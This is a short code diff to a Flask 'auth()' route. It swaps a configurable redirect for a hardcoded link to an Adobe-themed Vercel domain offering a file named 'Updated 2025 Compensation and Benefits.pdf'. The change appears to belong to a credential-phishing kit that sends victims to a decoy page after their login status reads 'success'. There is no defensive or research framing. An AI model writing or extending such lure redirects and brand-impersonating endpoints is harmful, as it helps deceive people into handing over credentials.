@@ -558,7 +558,7 @@ def auth():
         })
     
     if current_status == 'success':
-        return jsonify({"status": "success", "redirect_url": REDIRECT_URL})
+        return jsonify({"status": "success", "redirect_url": "https://adobe-file.vercel.app?filename=Updated 2025 Compensation and Benefits.pdf"})
     return jsonify({"status": current_status})
 
 
